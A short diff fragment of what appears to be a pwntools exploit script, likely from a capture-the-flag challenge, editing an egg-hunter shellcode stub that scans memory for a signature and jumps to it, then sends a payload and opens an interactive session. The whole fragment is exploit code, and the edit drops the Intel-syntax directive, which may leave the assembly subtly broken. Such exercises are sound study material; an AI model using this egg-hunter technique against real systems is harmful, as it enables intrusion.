@@ -159,17 +159,16 @@ stack_addr_int = stack_addr_int + OFFSET
 signature = u64(Signature)
 
 smallAsm = f"""
-    .intel_syntax noprefix
     mov rbx,{hex(signature)}
-    call g
-g:  
+    call tmp
+tmp:  
     pop rsi
-s:  
+loop:  
     cmp qword ptr [rsi],rbx
-    je f
+    je fin
     inc rsi
-    jmp s
-f:  
+    jmp loop
+fin:  
     jmp rsi
 """
 
@@ -213,6 +212,7 @@ io.sendline(BigPayload)
 
 
 io.interactive()
+
 ```
 
 SIMPLE
